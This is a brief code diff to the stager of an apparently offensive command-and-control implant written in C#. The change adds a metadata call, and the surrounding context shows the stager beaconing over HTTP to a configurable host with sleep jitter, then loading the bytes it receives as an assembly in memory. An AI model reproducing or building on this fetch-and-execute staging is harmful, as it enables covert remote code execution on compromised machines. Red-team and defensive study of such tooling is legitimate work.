@@ -32,6 +32,7 @@ class AgentStager
         try
         {
             var commModule = new HttpCommModule(ConnectHost, ConnectPort, SleepInterval, SleepJitter);
+            commModule.SetMetadata(AgentID);
             commModule.Start(crypto);
             commModule.SendStageRequest();
 
@@ -42,6 +43,7 @@ class AgentStager
                     if (message.Data.Command.Equals("StageOne", StringComparison.OrdinalIgnoreCase))
                     {
                         StagerStatus = StagerStatus.Staged;
+
                         commModule.Stop();
 
                         var asm = Assembly.Load(message.Data.Data);
